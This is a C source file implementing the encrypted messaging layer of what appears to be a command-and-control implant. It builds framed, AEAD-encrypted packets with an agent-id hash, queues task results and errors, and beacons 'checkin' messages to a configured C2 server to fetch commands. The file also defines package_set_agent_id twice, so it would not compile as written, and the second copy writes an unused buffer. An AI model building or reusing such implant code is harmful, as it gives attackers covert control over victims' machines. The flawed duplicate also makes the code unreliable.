/*
 * package.c — Wire-format package layer (framing + encryption + transport)
 *
 * References:
 *   crypto/crypto.h   (AEAD encrypt/decrypt)
 *   transport/http.h  (raw HTTP POST)
 *   config.h          (C2_SERVER_IP, C2_SERVER_PORT, C2_USER_AGENT, …)
 *
 * This file implements the full package API declared in package.h.
 */

#include "package.h"
#include "crypto/crypto.h"
#include "transport/http.h"
#include "config.h"

#include <stdlib.h>
#include <string.h>
#include <stdio.h>

/* ─── Internal configuration ──────────────────────────────────────────── */

/* The URI that all package traffic hits.  The server uses the agent_id in
 * the plaintext header to route, so a single endpoint suffices. */
#ifndef PACKAGE_TRANSPORT_URI
#define PACKAGE_TRANSPORT_URI   "/api"
#endif

/* Initial size of a new package's internal buffer (header + some room). */
#define PACKAGE_INITIAL_CAPACITY   256

/* Maximum agent-id string length (must match AGENT_ID_SIZE in main). */
#define AGENT_ID_BUF_SIZE          256

/* ─── Global state ─────────────────────────────────────────────────────── */

static char g_agent_id[AGENT_ID_BUF_SIZE] = {0};
static char g_pkg_agent_id[256] = {0};

/* Outgoing queue (single-linked).  NOT thread-safe. */
static package_t *g_queue_head = NULL;
static package_t *g_queue_tail = NULL;

/* ─── Forward declarations of internal helpers ────────────────────────── */

static int  ensure_capacity(ppackage_t pkg, size_t extra);
static void write_u32_be(uint8_t *dst, uint32_t val);
static void write_u64_be(uint8_t *dst, uint64_t val);
static uint32_t read_u32_be(const uint8_t *src);
static uint64_t read_u64_be(const uint8_t *src);
static int  finalize_package(ppackage_t pkg, uint8_t **out_wire, size_t *out_wire_len);
static int  transport_send(const uint8_t *data, size_t len,
                           uint8_t **out_resp, size_t *out_resp_len);

/* ─── Public helper (not in header – called by main after registration) ── */

/*
 * Must be called once after a successful registration so that the package
 * layer can fill the agent_id field in every header.
 */
void package_set_agent_id(const char *id) {
    if (id) {
        strncpy(g_agent_id, id, AGENT_ID_BUF_SIZE - 1);
        g_agent_id[AGENT_ID_BUF_SIZE - 1] = '\0';
    }
}

/* ─── Lifecycle ───────────────────────────────────────────────────────── */

ppackage_t package_create(uint32_t command) {
    ppackage_t pkg = (ppackage_t)calloc(1, sizeof(package_t));
    if (!pkg) return NULL;

    pkg->command    = command;
    pkg->request_id = 0;
    pkg->flags      = 0;
    pkg->encrypt    = 1;   /* encrypt by default */
    pkg->destroy    = 1;   /* free after transmit */
    pkg->included   = 0;
    pkg->next       = NULL;

    pkg->capacity   = PACKAGE_INITIAL_CAPACITY;
    pkg->length     = 0;
    pkg->buffer     = (uint8_t *)malloc(pkg->capacity);
    if (!pkg->buffer) {
        free(pkg);
        return NULL;
    }
    return pkg;
}

ppackage_t package_create_with_metadata(uint32_t command) {
    ppackage_t pkg = package_create(command);
    if (!pkg) return NULL;

    /* Pre-write the standard 24-byte header with placeholder values. */
    if (!ensure_capacity(pkg, PACKAGE_HEADER_SIZE)) {
        package_destroy(pkg);
        return NULL;
    }

    /* length (0 placeholder), magic, version */
    write_u32_be(pkg->buffer + 0,  0);
    write_u32_be(pkg->buffer + 4,  PACKAGE_MAGIC);
    *(uint16_t *)(pkg->buffer + 8)  = _byteswap_ushort(PACKAGE_PROTOCOL_VERSION);
    /* flags: set encrypted flag if we will encrypt */
    uint16_t flags = 0;
    if (pkg->encrypt) flags |= PKG_FLAG_ENCRYPTED;
    *(uint16_t *)(pkg->buffer + 10) = _byteswap_ushort(flags);
    pkg->flags = flags;

    /* agent_id */
    memset(pkg->buffer + 12, 0, 4);
    if (g_agent_id[0]) {
        /* agent_id is 4 bytes in header – we store a 32-bit hash of the
         * string for routing.  The full agent ID is not sent in every
         * message; the server can map this hash back to a session. */
        /* Simple djb2 hash (32-bit) */
        uint32_t hash = 5381;
        for (const char *s = g_agent_id; *s; s++)
            hash = ((hash << 5) + hash) + (unsigned char)*s;
        write_u32_be(pkg->buffer + 12, hash);
    }

    /* command */
    write_u32_be(pkg->buffer + 16, command);

    /* request_id (0) */
    write_u32_be(pkg->buffer + 20, 0);

    pkg->length = PACKAGE_HEADER_SIZE;
    return pkg;
}

ppackage_t package_create_with_request_id(uint32_t command, uint32_t request_id) {
    ppackage_t pkg = package_create_with_metadata(command);
    if (!pkg) return NULL;

    write_u32_be(pkg->buffer + 20, request_id);
    pkg->request_id = request_id;
    return pkg;
}

void package_destroy(ppackage_t pkg) {
    if (!pkg) return;
    free(pkg->buffer);
    free(pkg);
}

/* ─── Internal helpers ────────────────────────────────────────────────── */

static int ensure_capacity(ppackage_t pkg, size_t extra) {
    if (!pkg) return 0;
    size_t needed = pkg->length + extra;
    if (needed <= pkg->capacity) return 1;

    size_t new_cap = pkg->capacity * 2;
    if (new_cap < needed) new_cap = needed;
    uint8_t *new_buf = (uint8_t *)realloc(pkg->buffer, new_cap);
    if (!new_buf) return 0;

    pkg->buffer   = new_buf;
    pkg->capacity = new_cap;
    return 1;
}

static void write_u32_be(uint8_t *dst, uint32_t val) {
    dst[0] = (uint8_t)(val >> 24);
    dst[1] = (uint8_t)(val >> 16);
    dst[2] = (uint8_t)(val >> 8);
    dst[3] = (uint8_t)(val);
}

static void write_u64_be(uint8_t *dst, uint64_t val) {
    write_u32_be(dst,     (uint32_t)(val >> 32));
    write_u32_be(dst + 4, (uint32_t)(val));
}

static uint32_t read_u32_be(const uint8_t *src) {
    return ((uint32_t)src[0] << 24) |
           ((uint32_t)src[1] << 16) |
           ((uint32_t)src[2] << 8)  |
           ((uint32_t)src[3]);
}

static uint64_t read_u64_be(const uint8_t *src) {
    return ((uint64_t)read_u32_be(src) << 32) | read_u32_be(src + 4);
}

/* ─── Typed field appenders ───────────────────────────────────────────── */

void package_add_int32(ppackage_t pkg, uint32_t value) {
    if (!pkg) return;
    if (!ensure_capacity(pkg, 4)) return;
    write_u32_be(pkg->buffer + pkg->length, value);
    pkg->length += 4;
}

void package_add_int64(ppackage_t pkg, uint64_t value) {
    if (!pkg) return;
    if (!ensure_capacity(pkg, 8)) return;
    write_u64_be(pkg->buffer + pkg->length, value);
    pkg->length += 8;
}

void package_add_bool(ppackage_t pkg, int value) {
    /* Stored as 4-byte big-endian 0/1 for simplicity. */
    package_add_int32(pkg, value ? 1 : 0);
}

void package_add_ptr(ppackage_t pkg, const void *ptr) {
    if (!pkg) return;
    if (!ensure_capacity(pkg, 8)) return;
    write_u64_be(pkg->buffer + pkg->length, (uint64_t)(uintptr_t)ptr);
    pkg->length += 8;
}

void package_add_bytes(ppackage_t pkg, const uint8_t *data, size_t len) {
    if (!pkg) return;
    /* length prefix (4 bytes) + raw bytes */
    if (!ensure_capacity(pkg, 4 + len)) return;
    write_u32_be(pkg->buffer + pkg->length, (uint32_t)len);
    pkg->length += 4;
    if (len > 0) {
        memcpy(pkg->buffer + pkg->length, data, len);
        pkg->length += len;
    }
}

void package_add_string(ppackage_t pkg, const char *str) {
    if (!pkg) return;
    size_t len = str ? (strlen(str) + 1) : 1;  /* include null */
    if (!ensure_capacity(pkg, 4 + len)) return;
    write_u32_be(pkg->buffer + pkg->length, (uint32_t)len);
    pkg->length += 4;
    if (str) {
        memcpy(pkg->buffer + pkg->length, str, len);
    } else {
        pkg->buffer[pkg->length] = '\0';
    }
    pkg->length += len;
}

void package_add_wstring(ppackage_t pkg, const wchar_t *str) {
    if (!pkg) return;
    size_t len = str ? (wcslen(str) + 1) * sizeof(wchar_t) : sizeof(wchar_t);
    if (!ensure_capacity(pkg, 4 + len)) return;
    write_u32_be(pkg->buffer + pkg->length, (uint32_t)len);
    pkg->length += 4;
    if (str) {
        memcpy(pkg->buffer + pkg->length, str, len);
    } else {
        memset(pkg->buffer + pkg->length, 0, sizeof(wchar_t));
    }
    pkg->length += len;
}

void package_add_pad(ppackage_t pkg, const uint8_t *data, size_t len) {
    if (!pkg || !data || len == 0) return;
    if (!ensure_capacity(pkg, len)) return;
    memcpy(pkg->buffer + pkg->length, data, len);
    pkg->length += len;
}

/* ─── Finalise wire format ───────────────────────────────────────────────
 *
 * Takes a package whose buffer contains header (24 bytes) followed by
 * payload.  If encryption is enabled, encrypts the payload and replaces it
 * with {nonce || ciphertext || tag}.  Updates the header's length field.
 * Returns a malloc'd buffer with the complete wire representation.
 */
static int finalize_package(ppackage_t pkg,
                            uint8_t **out_wire, size_t *out_wire_len) {
    if (!pkg || !out_wire || !out_wire_len) return -1;

    uint8_t *payload      = pkg->buffer + PACKAGE_HEADER_SIZE;
    size_t   payload_len  = pkg->length - PACKAGE_HEADER_SIZE;

    uint8_t *wire         = NULL;
    size_t   wire_len     = 0;
    uint8_t *final_payload = NULL;
    size_t   final_payload_len = 0;

    if (pkg->encrypt) {
        /* Encrypt payload */
        uint8_t *cipher = aead_encrypt(payload, payload_len,
                                       &final_payload_len);
        if (!cipher) return -1;
        final_payload = cipher;
    } else {
        /* Plaintext payload: just copy */
        if (payload_len > 0) {
            final_payload = (uint8_t *)malloc(payload_len);
            if (!final_payload) return -1;
            memcpy(final_payload, payload, payload_len);
        }
        final_payload_len = payload_len;
    }

    /* Assemble final wire buffer: header + (encrypted or plain) payload */
    wire_len = PACKAGE_HEADER_SIZE + final_payload_len;
    wire = (uint8_t *)malloc(wire_len);
    if (!wire) {
        free(final_payload);
        return -1;
    }

    /* Copy the header (first 24 bytes) unchanged, except we'll overwrite
     * the length field with the real wire length (minus 4). */
    memcpy(wire, pkg->buffer, PACKAGE_HEADER_SIZE);
    /* Write the final length field: wire_len - 4 (bytes after length field) */
    write_u32_be(wire, (uint32_t)(wire_len - 4));

    if (final_payload_len > 0)
        memcpy(wire + PACKAGE_HEADER_SIZE, final_payload, final_payload_len);
    free(final_payload);

    *out_wire     = wire;
    *out_wire_len = wire_len;
    return 0;
}

/* ─── Raw transport send (thin wrapper around http_post_raw) ──────────── */
static int transport_send(const uint8_t *data, size_t len,
                          uint8_t **out_resp, size_t *out_resp_len) {
    uint8_t *resp_buf = NULL;
    int      resp_len = 0;

    int ret = http_post_raw(C2_SERVER_IP, C2_SERVER_PORT,
                            PACKAGE_TRANSPORT_URI,
                            data, (int)len,
                            &resp_buf, &resp_len);
    if (ret != 0 || !resp_buf || resp_len <= 0) {
        free(resp_buf);
        if (out_resp) *out_resp = NULL;
        if (out_resp_len) *out_resp_len = 0;
        return -1;
    }

    if (out_resp) *out_resp = resp_buf;
    else free(resp_buf);
    if (out_resp_len) *out_resp_len = (size_t)resp_len;
    return 0;
}

/* ─── Transmission ────────────────────────────────────────────────────── */

void package_transmit(ppackage_t pkg) {
    if (!pkg) return;

    pkg->next = NULL;  /* ensure clean */

    /* Append to tail of outgoing queue */
    if (!g_queue_tail) {
        g_queue_head = pkg;
        g_queue_tail = pkg;
    } else {
        g_queue_tail->next = pkg;
        g_queue_tail = pkg;
    }
}

int package_transmit_now(ppackage_t pkg,
                         uint8_t **out_response,
                         size_t   *out_response_len) {
    if (!pkg) {
        if (out_response) *out_response = NULL;
        if (out_response_len) *out_response_len = 0;
        return -1;
    }

    uint8_t *wire     = NULL;
    size_t   wire_len = 0;
    uint8_t *resp_raw = NULL;
    size_t   resp_raw_len = 0;

    /* Build wire format */
    if (finalize_package(pkg, &wire, &wire_len) != 0) {
        if (pkg->destroy) package_destroy(pkg);
        return -1;
    }

    /* Send */
    if (transport_send(wire, wire_len, &resp_raw, &resp_raw_len) != 0) {
        free(wire);
        if (pkg->destroy) package_destroy(pkg);
        return -1;
    }
    free(wire);

    /* Decrypt response if the request was encrypted (server will echo the
     * encrypted flag in its response header, but for simplicity we assume
     * it mirrors the same setting). */
    uint8_t *decrypted     = NULL;
    size_t   decrypted_len = 0;

    if (pkg->encrypt && resp_raw && resp_raw_len >= 12+16) {
        decrypted = aead_decrypt(resp_raw, resp_raw_len, &decrypted_len);
        free(resp_raw);
        resp_raw = decrypted;
        resp_raw_len = decrypted ? decrypted_len : 0;
    }

    if (out_response)      *out_response      = resp_raw;
    else if (resp_raw)     free(resp_raw);
    if (out_response_len)  *out_response_len  = resp_raw_len;

    if (pkg->destroy) package_destroy(pkg);
    return 0;
}

int package_transmit_all(uint8_t **out_response,
                         size_t   *out_response_len) {
    /* If the queue is empty, we still send an empty checkin so the server
     * knows the agent is alive and can send commands. */
    if (!g_queue_head) {
        ppackage_t ping = package_create_with_metadata(PKG_CMD_CHECKIN);
        if (!ping) return -1;
        /* Force encrypted flag (already set by default), set request_id=0 */
        return package_transmit_now(ping, out_response, out_response_len);
    }

    /* Build a batch package */
    ppackage_t batch = package_create_with_metadata(PKG_CMD_CHECKIN);
    if (!batch) return -1;
    batch->flags |= PKG_FLAG_BATCH;
    /* Update the header flags */
    *(uint16_t *)(batch->buffer + 10) = _byteswap_ushort(batch->flags);

    /* Collect all queued packages and serialize each to a blob */
    package_t *curr = g_queue_head;
    while (curr) {
        uint8_t *sub_wire = NULL;
        size_t   sub_len  = 0;
        if (finalize_package(curr, &sub_wire, &sub_len) == 0) {
            package_add_pad(batch, sub_wire, sub_len);
            free(sub_wire);
        }
        /* Remove from queue */
        package_t *next = curr->next;
        /* We'll destroy after the loop */
        curr->next = NULL;
        package_destroy(curr);
        curr = next;
    }
    g_queue_head = NULL;
    g_queue_tail = NULL;

    /* Now transmit the batch */
    return package_transmit_now(batch, out_response, out_response_len);
}

/* ─── Convenience: error reporting ────────────────────────────────────── */

void package_transmit_error(uint32_t request_id, uint32_t error_code) {
    ppackage_t pkg = package_create_with_request_id(PKG_CMD_TASK_ERROR,
                                                    request_id);
    if (!pkg) return;
    package_add_int32(pkg, error_code);
    package_transmit(pkg);
}

/* ─── Reader API ──────────────────────────────────────────────────────── */

void package_reader_init(package_reader_t *r, const uint8_t *data, size_t len) {
    r->data   = data;
    r->length = len;
    r->offset = 0;
}

static int reader_check(package_reader_t *r, size_t need) {
    if (!r || r->offset + need > r->length) return 0;
    return 1;
}

int package_read_int32(package_reader_t *r, uint32_t *out) {
    if (!reader_check(r, 4)) return 0;
    *out = read_u32_be(r->data + r->offset);
    r->offset += 4;
    return 1;
}

int package_read_int64(package_reader_t *r, uint64_t *out) {
    if (!reader_check(r, 8)) return 0;
    *out = read_u64_be(r->data + r->offset);
    r->offset += 8;
    return 1;
}

int package_read_bool(package_reader_t *r, int *out) {
    uint32_t v = 0;
    if (!package_read_int32(r, &v)) return 0;
    *out = (v != 0);
    return 1;
}

int package_read_bytes(package_reader_t *r,
                       const uint8_t **out, size_t *out_len) {
    uint32_t len = 0;
    if (!reader_check(r, 4)) return 0;
    len = read_u32_be(r->data + r->offset);
    r->offset += 4;
    if (!reader_check(r, len)) return 0;
    *out = r->data + r->offset;
    if (out_len) *out_len = len;
    r->offset += len;
    return 1;
}

int package_read_string(package_reader_t *r,
                        const char **out, size_t *out_len) {
    const uint8_t *bytes = NULL;
    size_t         len   = 0;
    if (!package_read_bytes(r, &bytes, &len)) return 0;
    /* Sanity: ensure it is null-terminated (it should be) */
    if (len == 0 || bytes[len-1] != '\0') return 0;
    *out = (const char *)bytes;
    if (out_len) *out_len = len;
    return 1;
}

int package_read_wstring(package_reader_t *r,
                         const wchar_t **out, size_t *out_len) {
    const uint8_t *bytes = NULL;
    size_t         len   = 0;
    if (!package_read_bytes(r, &bytes, &len)) return 0;
    /* Must be multiple of sizeof(wchar_t) and null-terminated */
    if (len % sizeof(wchar_t) != 0 || len == 0) return 0;
    const wchar_t *w = (const wchar_t *)bytes;
    if (w[len / sizeof(wchar_t) - 1] != L'\0') return 0;
    *out = w;
    if (out_len) *out_len = len;
    return 1;
}

int package_reader_parse_header(package_reader_t *r, package_header_t *hdr) {
    if (!r || !hdr) return 0;
    if (r->length < PACKAGE_HEADER_SIZE) return 0;

    hdr->length     = read_u32_be(r->data);
    hdr->magic      = read_u32_be(r->data + 4);
    hdr->version    = (uint16_t)((r->data[8]  << 8) | r->data[9]);
    hdr->flags      = (uint16_t)((r->data[10] << 8) | r->data[11]);
    hdr->agent_id   = read_u32_be(r->data + 12);
    hdr->command    = read_u32_be(r->data + 16);
    hdr->request_id = read_u32_be(r->data + 20);

    r->offset = PACKAGE_HEADER_SIZE;
    return 1;
}

void package_set_agent_id(const char *id) {
    if (id) {
        strncpy(g_pkg_agent_id, id, sizeof(g_pkg_agent_id) - 1);
        g_pkg_agent_id[sizeof(g_pkg_agent_id) - 1] = '\0';
    }
}